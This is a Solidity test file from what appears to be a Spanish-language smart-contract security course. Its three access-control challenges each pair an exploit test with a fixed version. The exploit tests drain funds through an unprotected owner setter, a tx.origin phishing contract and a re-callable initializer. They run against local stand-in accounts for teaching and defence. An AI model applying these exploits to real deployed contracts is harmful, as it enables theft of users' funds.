// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseChallenge} from "./base/BaseChallenge.t.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Initializable} from "@openzeppelin/contracts/proxy/utils/Initializable.sol";
import {BovedaVulnerable, WalletTxOriginVulnerable, BovedaInicializableVulnerable} from "../src/C1-control-acceso/Vulnerable.sol";
import {BovedaFixed, WalletTxOriginFixed, BovedaInicializableFixed} from "../src/C1-control-acceso/Fixed.sol";

/// @notice Contrato de phishing para la variante tx.origin.
/// El owner, engañado, llama a `reclamaPremio()`; este reenvía la llamada a la
/// wallet víctima, que autoriza por `tx.origin` (el owner) y envía los fondos.
contract Phishing {
    address payable public wallet;
    address payable public atacante;

    constructor(address payable _wallet, address payable _atacante) {
        wallet = _wallet;
        atacante = _atacante;
    }

    function reclamaPremio() external {
        WalletTxOriginVulnerable(wallet).transfer(atacante, wallet.balance);
    }
}

contract C1_ControlAcceso is BaseChallenge {
    // Variante A: función desprotegida (reto principal)

    function test_Exploit_Vulnerable() public {
        vm.prank(deployer);
        BovedaVulnerable boveda = new BovedaVulnerable{value: 10 ether}();
        assertFalse(boveda.isSolved(), "no debe partir resuelto");

        // El atacante se nombra owner y vacía la bóveda en dos transacciones.
        vm.startPrank(attacker);
        boveda.setOwner(attacker);
        boveda.withdrawAll();
        vm.stopPrank();

        assertTrue(boveda.isSolved(), "la boveda debe quedar vacia");
        assertEq(boveda.owner(), attacker, "el atacante debe ser el nuevo owner");
        assertEq(attacker.balance, 20 ether, "el atacante se lleva los 10 ETH");
    }

    function test_Fixed_Resiste() public {
        vm.prank(deployer);
        BovedaFixed boveda = new BovedaFixed{value: 10 ether}();

        // El atacante no puede apropiarse del contrato ni retirar: onlyOwner
        // revierte con el error de Ownable que identifica a quien llama.
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, attacker));
        vm.prank(attacker);
        boveda.transferOwnership(attacker);

        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, attacker));
        vm.prank(attacker);
        boveda.withdrawAll();

        assertFalse(boveda.isSolved(), "la version corregida no se resuelve");
        assertEq(address(boveda).balance, 10 ether, "los fondos siguen en la boveda");
    }

    // Variante B: autorización por tx.origin

    function test_Exploit_TxOrigin_Vulnerable() public {
        vm.prank(deployer);
        WalletTxOriginVulnerable wallet = new WalletTxOriginVulnerable{value: 5 ether}();

        Phishing phishing = new Phishing(payable(address(wallet)), payable(attacker));

        // El owner (deployer), engañado, interactúa con el contrato malicioso.
        // tx.origin sigue siendo el owner durante toda la cadena de llamadas.
        vm.prank(deployer, deployer);
        phishing.reclamaPremio();

        assertTrue(wallet.isSolved(), "la wallet debe quedar vacia");
        assertEq(attacker.balance, 15 ether, "los fondos llegan al atacante");
    }

    function test_Fixed_TxOrigin_Resiste() public {
        vm.prank(deployer);
        WalletTxOriginFixed wallet = new WalletTxOriginFixed{value: 5 ether}();

        Phishing phishing = new Phishing(payable(address(wallet)), payable(attacker));

        // Ahora msg.sender es el contrato de phishing, no el owner: revierte.
        vm.prank(deployer, deployer);
        vm.expectRevert(bytes("no autorizado"));
        phishing.reclamaPremio();

        assertFalse(wallet.isSolved(), "la version corregida no se resuelve");
        assertEq(address(wallet).balance, 5 ether, "los fondos siguen en la wallet");
    }
    // Variante C: inicialización desprotegida

    function test_Exploit_Inicializacion_Vulnerable() public {
        // El despliegue y la inicialización van en transacciones separadas.
        vm.prank(deployer);
        BovedaInicializableVulnerable boveda = new BovedaInicializableVulnerable();
        vm.prank(deployer);
        boveda.initialize(deployer);
        vm.prank(user1);
        boveda.deposit{value: 10 ether}();

        // initialize sigue abierta: el atacante la vuelve a llamar y se nombra owner.
        vm.startPrank(attacker);
        boveda.initialize(attacker);
        boveda.withdrawAll();
        vm.stopPrank();

        assertEq(boveda.owner(), attacker, "el atacante reinicializa y es owner");
        assertTrue(boveda.isSolved(), "la boveda queda vacia");
        assertEq(attacker.balance, 20 ether, "el atacante se lleva los 10 ETH");
    }

    function test_Fixed_Inicializacion_Resiste() public {
        vm.prank(deployer);
        BovedaInicializableFixed boveda = new BovedaInicializableFixed(deployer);
        vm.prank(user1);
        boveda.deposit{value: 10 ether}();

        // Segunda inicialización: initializer la rechaza.
        vm.prank(attacker);
        vm.expectRevert(Initializable.InvalidInitialization.selector);
        boveda.initialize(attacker);

        vm.prank(attacker);
        vm.expectRevert(bytes("solo owner"));
        boveda.withdrawAll();

        assertEq(boveda.owner(), deployer, "el owner no cambia");
        assertFalse(boveda.isSolved(), "la version corregida no se resuelve");
    }
}
